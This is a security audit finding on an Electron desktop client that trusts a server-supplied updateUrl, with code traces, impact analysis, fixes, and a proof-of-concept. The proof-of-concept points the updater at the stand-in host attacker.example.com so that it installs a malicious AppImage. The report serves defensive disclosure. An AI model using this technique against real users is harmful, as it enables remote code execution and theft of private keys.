Audit Report

## Title
Malicious Organization Server Can Supply Arbitrary `updateUrl` to Electron Client, Enabling Unvalidated Binary Installation

## Summary
The Electron desktop client accepts an `updateUrl` verbatim from any organization server's HTTP 426 response body and passes it, without any scheme, domain, or allowlist validation, to `electron-updater`'s `setFeedURL()`. A malicious or compromised organization server can direct the client to download and install an arbitrary binary, achieving remote code execution on Linux or a downgrade attack on Windows/macOS.

## Finding Description

**Step 1 — Unvalidated URL extracted from server response**

In `front-end/src/renderer/utils/axios.ts`, the global Axios response interceptor handles HTTP 426 responses:

```ts
const errorUpdateUrl = error.response.data?.updateUrl || null;
``` [1](#0-0) 

No scheme check (`https://` only), no domain allowlist, and no integrity check is applied to `errorUpdateUrl`. It is passed directly to `setOrgVersionBelowMinimum`:

```ts
setOrgVersionBelowMinimum(serverUrl, errorUpdateUrl);
``` [2](#0-1) 

**Step 2 — URL stored in reactive state**

`setOrgVersionBelowMinimum` in `front-end/src/renderer/stores/versionState.ts` stores the attacker-controlled URL without modification:

```ts
organizationUpdateUrls.value[serverUrl] = url;
``` [3](#0-2) 

**Step 3 — URL read and used in the mandatory upgrade modal**

`MandatoryUpgrade.vue` reads the stored URL and passes it to `startUpdate()` when the user clicks "Download Update":

```ts
const orgUpdateUrl = computed(() => {
  const serverUrl = triggeringOrganizationServerUrl.value;
  if (serverUrl && organizationUpdateUrls.value[serverUrl]) {
    return organizationUpdateUrls.value[serverUrl]; // attacker-controlled
  }
  return updateUrl.value;
});
const handleDownload = () => {
  const urlToUse = orgUpdateUrl.value;
  if (urlToUse) { startUpdate(urlToUse); }
};
``` [4](#0-3) 

**Step 4 — URL forwarded to Electron main process via IPC with no validation**

`useElectronUpdater.ts` sends the URL over IPC:

```ts
window.electronAPI.local.update.startDownload(updateUrl);
``` [5](#0-4) 

The IPC handler in `front-end/src/main/modules/ipcHandlers/update.ts` calls `checkForUpdatesAndDownload` with no validation:

```ts
ipcMain.on(createChannelName('start-download'), (_e, updateUrl: string) => {
  const updaterService = getUpdaterService();
  if (updaterService) {
    updaterService.checkForUpdatesAndDownload(updateUrl);
  }
});
``` [6](#0-5) 

**Step 5 — URL passed directly to `setFeedURL` with no validation**

`ElectronUpdaterService.initialize()` in `front-end/src/main/services/electronUpdater.ts` calls:

```ts
this.updater.setFeedURL({
  provider: 'generic',
  url: updateUrl,
});
``` [7](#0-6) 

There is no domain allowlist, no HTTPS enforcement, and no check that the URL belongs to the official release host at any point in the chain. [8](#0-7) 

## Impact Explanation

**Linux**: `electron-updater` in `generic` provider mode performs no code-signature verification on Linux. An attacker-controlled server can serve a `latest-linux.yml` manifest pointing to a malicious AppImage. The client downloads and executes it, achieving **remote code execution** with the user's privileges. The user's Hedera private keys stored in the local SQLite database and all session credentials become accessible to the attacker.

**Windows / macOS**: `electron-updater` verifies the code signature of the downloaded binary, so an unsigned malicious binary will be rejected. However, the attacker can serve a legitimately-signed but older version of the application (downgrade attack), re-exposing the user to previously patched vulnerabilities.

## Likelihood Explanation

- The backend is open-source; any party can run a conforming organization server.
- No privileged access to Hashgraph infrastructure is required.
- The `MandatoryUpgrade.vue` modal presents only two options — "Disconnect" or "Download Update" — with no way to continue using the application while connected to the organization. A user who wants to remain connected will click download, making the required user action low-friction and part of the normal workflow. [9](#0-8) 
- The attack is realistic in phishing or fake enterprise deployment scenarios where users are directed to connect to a new organization server.

## Recommendation

1. **Allowlist the update URL on the client side**: Before calling `setFeedURL`, validate that the URL's scheme is `https` and its hostname matches a hardcoded allowlist of official release hosts (e.g., `github.com`, `releases.hashgraph.com`).
2. **Enforce HTTPS**: Reject any `updateUrl` that does not begin with `https://`.
3. **Validate in the IPC handler**: Add URL validation in `front-end/src/main/modules/ipcHandlers/update.ts` before forwarding to `checkForUpdatesAndDownload`, so the main process is not solely dependent on renderer-side checks.
4. **Pin the update URL at build time**: Embed the canonical update base URL as a compile-time constant and ignore any server-supplied URL entirely, using the server-supplied URL only as a signal that an update is available, not as the download source.

## Proof of Concept

1. Stand up a server that implements the organization API protocol (source is public).
2. Configure it to return HTTP 426 on any request with body `{ "updateUrl": "http://attacker.example.com/updates" }`.
3. On `http://attacker.example.com/updates`, host a `latest-linux.yml` pointing to a malicious AppImage with a version number higher than the client's current version.
4. Direct a victim user to connect to the malicious organization server.
5. The client receives the 426 response; `errorUpdateUrl` is set to `http://attacker.example.com/updates`. [10](#0-9) 
6. The `MandatoryUpgrade.vue` modal appears. The user clicks "Download Update". [11](#0-10) 
7. `setFeedURL({ provider: 'generic', url: 'http://attacker.example.com/updates' })` is called. [7](#0-6) 
8. `electron-updater` fetches `latest-linux.yml` from the attacker's server, downloads the malicious AppImage, and installs it. The attacker achieves RCE on the victim's Linux machine.
